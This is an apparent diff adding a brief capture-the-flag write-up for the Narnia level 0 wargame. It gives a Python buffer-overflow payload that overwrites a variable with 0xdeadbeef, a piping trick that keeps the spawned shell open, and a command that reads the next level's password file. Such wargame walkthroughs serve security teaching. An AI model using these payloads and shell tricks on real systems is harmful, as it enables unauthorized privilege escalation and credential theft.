@@ -1,0 +1,23 @@
+Simple level, c reads in a char array that only takes in 20 characters.
+
+It then checks that the previously defined 'val' value is set to 0xdeadbeef
+
+By writing a simple lil python script:
+_________________________________________________
+payload = b'A'*20 + b'\xef\xbe\xad\xde'
+print(payload)
+_________________________________________________
+
+You can pipe the output to narnia0
+
+python payload.py | ./narnia0
+
+That will execute /bin/sh with as narnia1, the owner, but unfortunately the stdin closes, so now what?
+
+
+By appending && to the python half of the command with cat, it then attempts to find an input for cat by keeping stdin open
+
+
+(python payload.py && cat) | ./narnia0
+
+Doing so grants an escalated shell, allowing you to send 'cat /etc/narnia_pass/narnia1'
